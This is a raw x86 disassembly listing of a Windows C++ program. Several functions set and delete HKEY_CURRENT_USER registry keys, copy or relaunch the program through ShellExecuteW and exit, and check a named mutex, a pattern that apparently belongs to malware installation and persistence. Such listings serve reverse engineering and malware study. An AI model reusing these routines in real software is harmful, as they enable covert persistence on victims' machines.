add esp 0x20
mov esi rw-data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
mov edi 0x208
lea eax [ ebp - 0x27c ]
push edi
mov esi rw-data
push eax
push r--data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov ebx 0x80000001
push eax
push ebx
call sub_40a5ae
add esp 0x1c
test al al
jne r-xdata
mov ecx ebx
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push r--data
push esi
call sub_40a878
add esp 0xc
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push ebx
call [ RegDeleteKeyA@IAT ]
lea eax [ ebp - 0x27c ]
push edi
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
jmp r-xdata
mov esi r--data
mov edi rw-data
push esi
push edi
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
and [ ebp - 0x1 ] al
mov ebx [ SetFileAttributesW@IAT ]
lea eax [ ebp - 0x27c ]
push 0x80
push eax
mov [ ebp - 0x1 ] 0x1
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x2 ]
push r--data
push eax
push r--data
call [ _wgetenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x54 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x2 ]
lea ecx [ ebp - 0x14 ]
push eax
push r--data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x24 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
add esp 0xc
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push 0x80
mov ecx rw-data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call ebx
mov ebx r--data
lea eax [ ebp - 0x27c ]
push ebx
push eax
lea eax [ ebp - 0x2 ]
lea ecx [ ebp - 0x14 ]
push eax
push r--data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x24 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
lea eax [ ebp - 0x2 ]
push r--data
push eax
lea eax [ ebp - 0x27c ]
push eax
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x44 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x24 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push esi
push edi
call [ std::operator!=@IAT ]
pop ecx
test al al
pop ecx
je r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
lea eax [ ebp - 0x2 ]
push r--data
push eax
push r--data
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x14 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x24 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push r--data
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
xor edi edi
lea ecx [ ebp - 0x54 ]
push edi
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::length@IAT ]
shl eax 0x1
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_4114e1
add esp 0x10
test al al
je r-xdata
push ebx
push edi
lea eax [ ebp - 0x44 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@PBGABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x24 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
pop edi
pop esi
pop ebx
leave
retn
push edi
push esi
push esi
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push r--data
push edi
call [ ShellExecuteW@IAT ]
cmp eax 0x20
jle r-xdata
push edi
call [ exit@IAT ]
sub_407af4
push ebp
mov ebp esp
sub esp 0x27c
push esi
push edi
call sub_409cc8
mov esi rw-data
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
mov esi 0x208
lea eax [ ebp - 0x27c ]
push esi
push eax
push r--data
mov ecx rw-data
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_40a5ae
add esp 0x1c
xor edi edi
test al al
jne r-xdata
lea eax [ ebp - 0x1 ]
push r--data
push eax
push r--data
call [ _wgetenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea eax [ ebp - 0x1 ]
push r--data
push eax
push r--data
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x27c ]
push eax
lea eax [ ebp - 0x2 ]
push eax
push r--data
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
push eax
lea eax [ ebp - 0x74 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
lea eax [ ebp - 0x24 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@PBG@Z
add esp 0xc
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push r--data
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator-=@IAT ]
push edi
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::length@IAT ]
shl eax 0x1
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call sub_4114e1
add esp 0x10
test al al
je r-xdata
lea eax [ ebp - 0x27c ]
push esi
push eax
push edi
call [ GetModuleFileNameW@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
pop edi
pop esi
leave
retn
mov eax r--data
push edi
push eax
push eax
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push r--data
push edi
call [ ShellExecuteW@IAT ]
cmp eax 0x20
jle r-xdata
push edi
call [ exit@IAT ]
sub_407ca7
push ebp
mov ebp esp
sub esp 0x20
lea eax [ ebp + 0x13 ]
lea ecx [ ebp - 0x10 ]
push eax
push [ ebp + 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x20 ]
push eax
call sub_410ee4
pop ecx
pop ecx
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_407cfa
add esp 0xc
lea ecx [ ebp - 0x20 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_407cfa
push ebp
mov ebp esp
sub esp 0x28c
lea eax [ ebp - 0x2 ]
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
movsx eax [ ebp + 0xc ]
add eax 0xffffffd0
cmp eax 0x7
ja r-xdata
push esi
lea eax [ ebp - 0x28c ]
push 0x208
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
push eax
call [ GetLongPathNameW@IAT ]
mov esi eax
lea eax [ ebp + 0xf ]
push eax
lea ecx [ ebp - 0x24 ]
push [ ebp + 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp + 0x13 ]
push eax
push r--data
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea eax [ ebp - 0x28c ]
push esi
push eax
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
push eax
push [ ebp + 0x8 ]
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x44 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x24 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
pop esi
leave
retn
jmp [ eax * 4 + jump_table_407ef1 ]
push r--data
jmp r-xdata
lea eax [ ebp - 0x84 ]
push eax
call sub_41055d
pop ecx
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x84 ]
jmp r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
call sub_41123a
test al al
jne r-xdata
push r--data
jmp r-xdata
push r--data
jmp r-xdata
push r--data
call [ _wgetenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
jmp r-xdata
lea eax [ ebp - 0x3 ]
lea ecx [ ebp - 0x44 ]
push eax
push r--data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x1 ]
push eax
push r--data
call [ _wgetenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x34 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x54 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x44 ]
jmp r-xdata
lea eax [ ebp + 0xf ]
lea ecx [ ebp - 0x24 ]
push eax
push r--data
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x2 ]
push eax
push r--data
call [ _wgetenv@IAT ]
pop ecx
push eax
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push eax
lea eax [ ebp - 0x64 ]
push eax
call ??Hstd@@YA?AV?$basic_string@GU?$char_traits@G@std@@V?$allocator@G@2@@0@ABV10@0@Z
add esp 0xc
lea ecx [ ebp - 0x14 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::operator=@IAT ]
lea ecx [ ebp - 0x64 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x74 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x24 ]
sub_40801d
push ebp
mov ebp esp
sub esp 0x2ec
push ebx
push esi
lea eax [ ebp - 0x58 ]
push edi
push eax
call sub_408ae6
sub esp 0xc
lea eax [ ebp - 0x15 ]
mov ecx esp
push eax
push [ rw-data ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
sub esp 0x10
lea eax [ ebp - 0x58 ]
mov ecx esp
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x28 ]
push eax
call sub_41113a
add esp 0x24
mov esi rw-data
mov ecx esi
push eax
call sub_409234
lea ecx [ ebp - 0x28 ]
call sub_401ad8
mov edi [ ebp + 0x10 ]
mov eax r--data
xor ebx ebx
sbb eax eax
sbb eax 0xffffffff
cmp cl bl
je r-xdata
push 0x3
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::data@IAT ]
cmp [ eax ] bl
push r--data
push 0xe
mov ecx esi
setne al
mov [ rw-data ] al
call sub_401289
push eax
lea eax [ ebp - 0x10 ]
push r--data
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@PBDABV10@@Z
add esp 0xc
push eax
lea eax [ ebp - 0x28 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@PBD@Z
add esp 0xc
mov edi rw-data
mov ecx edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x28 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push ebx
push 0x32
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
cmp [ eax ] bl
push ebx
push 0x33
mov ecx esi
setne al
mov [ rw-data ] al
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
cmp [ eax ] bl
setne al
cmp [ rw-data ] bl
mov [ rw-data ] al
je r-xdata
push 0x1
push 0x12
push r--data
lea ecx [ ebp - 0xe4 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::basic_ofstream<char,struct std::char_traits<char> >@IAT ]
push 0x34
mov ecx esi
call sub_401289
mov ecx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
lea eax [ ebp - 0xe4 ]
push eax
call [ std::operator<<@IAT ]
pop ecx
pop ecx
lea ecx [ ebp - 0xe4 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::close@IAT ]
lea ecx [ ebp - 0xe4 ]
call [ std::basic_ofstream<char,struct std::char_traits<char> >::`vector deleting destructor'@IAT ]
lea ecx [ ebp - 0x58 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push 0x1
pop eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov dl [ edi + 0x1 ]
mov cl dl
cmp dl [ eax + 0x1 ]
jne r-xdata
push r--data
push ebx
push 0x100000
mov [ ebp - 0x14 ] ebx
call [ OpenMutexA@IAT ]
cmp eax ebx
mov [ ebp + 0x10 ] eax
je r-xdata
lea eax [ ebp + 0x10 ]
mov ecx edi
push eax
push r--data
mov [ ebp + 0x10 ] ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push 0x80000001
call sub_40a3e4
add esp 0x10
test al al
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x10
cmp eax ebx
jne r-xdata
